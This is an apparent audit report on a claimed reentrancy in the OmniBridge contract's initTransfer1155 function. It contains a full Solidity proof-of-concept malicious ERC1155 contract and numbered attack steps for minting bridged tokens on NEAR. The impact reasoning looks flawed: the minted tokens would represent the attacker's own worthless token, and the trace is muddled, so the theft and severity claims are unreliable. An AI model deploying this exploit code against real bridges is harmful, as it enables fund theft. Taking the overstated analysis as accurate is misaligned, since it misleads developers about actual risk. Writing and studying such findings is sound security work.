### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 `safeTransferFrom` Causes Nonce Collision and Unauthorized Token Minting on NEAR — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` at the top of the function but reads it again from storage when emitting the `InitTransfer` event and when calling `initTransferExtension`. Because the intermediate external call `IERC1155(tokenAddress).safeTransferFrom(...)` is made to a fully attacker-controlled contract with no reentrancy guard present, a malicious ERC1155 can re-enter `initTransfer1155`, increment the nonce a second time, and cause both the inner and outer invocations to emit `InitTransfer` events carrying the same (highest) nonce value — while locking zero tokens on the EVM side.

---

### Finding Description

`OmniBridge.sol` contains no `ReentrancyGuard` and no `nonReentrant` modifier. In `initTransfer1155`:

```
currentOriginNonce += 1;                          // line 448 — nonce = N
...
IERC1155(tokenAddress).safeTransferFrom(          // line 458 — external call to attacker-controlled contract
    msg.sender, address(this), tokenId, amount, ""
);
...
initTransferExtension(..., currentOriginNonce, ...); // line 471 — reads storage value
emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...); // line 483 — reads storage value
``` [1](#0-0) [2](#0-1) [3](#0-2) 

The nonce is cached nowhere; both `initTransferExtension` and the `emit` statement re-read `currentOriginNonce` from storage at the moment they execute. A re-entrant call that increments the nonce again will corrupt the value seen by the outer frame.

`logMetadata1155` is fully permissionless — any caller can register any `(tokenAddress, tokenId)` pair: [4](#0-3) 

`initTransfer1155` itself performs no whitelist check on `tokenAddress`: [5](#0-4) 

The EVM CLAUDE.md documents the intended invariant as "Always mutate state (e.g. mark nonce used) before any external call" and "State before external calls … is the primary reentrancy defense," but `initTransfer1155` violates this: the nonce is incremented before the external call, yet it is **read** after it, making the post-call read vulnerable to corruption. [6](#0-5) 

---

### Impact Explanation

**Reentrancy execution trace (nativeFee = 0 for simplicity):**

| Step | `currentOriginNonce` | Action |
|---|---|---|
| Outer call enters | 0 → **1** | `currentOriginNonce += 1` |
| Outer call hits `safeTransferFrom` | 1 | Malicious ERC1155 re-enters `initTransfer1155` |
| Inner call enters | 1 → **2** | `currentOriginNonce += 1` |
| Inner call hits `safeTransferFrom` | 2 | Malicious ERC1155 returns (no tokens transferred) |
| Inner call emits event | 2 | `InitTransfer(sender=MaliciousERC1155, nonce=2)` — **no tokens locked** |
| Outer `safeTransferFrom` returns | 2 | Malicious ERC1155 returns (no tokens transferred) |
| Outer call emits event | 2 | `InitTransfer(sender=attacker, nonce=2)` — **no tokens locked** |

Outcome:
- Nonce 1 is permanently consumed but never emitted; any tokens that would have been locked for nonce 1 are lost.
- Two `InitTransfer` events with nonce 2 are emitted; zero ERC1155 tokens are held by the bridge.
- The NEAR side (via light-client proof or Wormhole VAA) sees a valid on-chain event for nonce 2 and mints the corresponding bridged tokens to the attacker's NEAR address.
- The duplicate nonce-2 event is rejected by NEAR as already finalized, so the attacker receives one full mint for free.

This constitutes **unauthorized minting / theft of bridged funds**: tokens are created on NEAR with no corresponding collateral locked on EVM.

---

### Likelihood Explanation

The attack path is fully permissionless:

1. Deploy a malicious ERC1155 contract (no admin approval required).
2. Call `logMetadata1155(maliciousERC1155, tokenId)` — permissionless, no access control.
3. Wait for the NEAR side to index the `LogMetadata` event and register the token (standard relayer latency, ~seconds to minutes).
4. Call `initTransfer1155` with `nativeFee = 0` and the malicious ERC1155 address.

No privileged role, no leaked key, no validator collusion, and no front-running is required. The only prerequisite is that the NEAR side has processed the `LogMetadata` event, which happens automatically via the relayer.

---

### Recommendation

1. **Add `ReentrancyGuard`**: Import OpenZeppelin's `ReentrancyGuard` and apply `nonReentrant` to both `initTransfer` and `initTransfer1155`.

2. **Cache the nonce locally**: Read `currentOriginNonce` into a local variable immediately after incrementing it, and use that local variable in all subsequent references within the same function call:

```solidity
function initTransfer1155(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 originNonce = currentOriginNonce; // cache here
    ...
    IERC1155(tokenAddress).safeTransferFrom(...);
    ...
    initTransferExtension(..., originNonce, ...);
    emit BridgeTypes.InitTransfer(..., originNonce, ...);
}
```

Apply the same fix to `initTransfer`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import {IOmniBridge} from "./IOmniBridge.sol";

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool private _reentered;

    constructor(address bridge_) { bridge = IOmniBridge(bridge_); }

    // Called by OmniBridge.initTransfer1155 → IERC1155(this).safeTransferFrom(...)
    function safeTransferFrom(
        address /*from*/, address /*to*/,
        uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (!_reentered) {
            _reentered = true;
            // Re-enter initTransfer1155; msg.sender here is the bridge,
            // nativeFee = 0 so no ETH needed.
            bridge.initTransfer1155(
                address(this), tokenId, uint128(amount),
                0, 0, "near:attacker.near", ""
            );
            // Return without transferring any tokens.
        }
        // Second call (inner frame): also return without transferring tokens.
    }

    // Minimal ERC1155 stubs
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack script:
// 1. Deploy MaliciousERC1155(bridge)
// 2. bridge.logMetadata1155(address(malicious), tokenId)   // permissionless
// 3. Wait for NEAR to index LogMetadata
// 4. bridge.initTransfer1155(address(malicious), tokenId, amount, 0, 0, "near:attacker.near", "")
//    → Two InitTransfer events emitted with nonce N+1, zero tokens locked
//    → NEAR mints `amount` tokens to attacker.near for free
```

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L234-270)
```text
    function logMetadata1155(
        address tokenAddress,
        uint256 tokenId
    ) external payable {
        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        MultiTokenInfo storage multiToken = multiTokens[deterministicToken];

        if (multiToken.tokenAddress == address(0)) {
            multiToken.tokenAddress = tokenAddress;
            multiToken.tokenId = tokenId;
        } else {
            if (
                multiToken.tokenAddress != tokenAddress ||
                multiToken.tokenId != tokenId
            ) {
                revert ERC1155MappingMismatch();
            }
        }

        logMetadataExtension(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );

        emit BridgeTypes.LogMetadata(
            deterministicToken,
            Strings.toHexString(tokenAddress),
            "",
            0
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L439-447)
```text
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L448-448)
```text
        currentOriginNonce += 1;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L458-464)
```text
        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L471-483)
```text
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
```

**File:** evm/CLAUDE.md (L34-34)
```markdown
- **State before external calls**: Always mutate state (e.g. mark nonce used) before any external call (token transfer, ETH send, custom minter). This is the primary reentrancy defense
```
